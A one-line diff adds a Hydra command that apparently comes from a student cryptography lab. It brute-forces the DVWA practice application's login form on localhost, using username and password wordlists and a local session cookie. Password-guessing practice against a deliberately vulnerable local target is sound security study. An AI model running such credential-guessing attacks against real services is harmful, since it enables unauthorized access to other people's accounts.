@@ -1,0 +1,1 @@
+./hydra -L /home/pablo/Escritorio/s8/Cripto/lab2/users.txt -P /home/pablo/Escritorio/s8/Cripto/lab2/Top207-probable-v2.txt "http-get-form://127.0.0.1:8080/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=u596ojl2q5vgv2t5imepc3puc0; security=low;:F=Username and/or password incorrect." -I
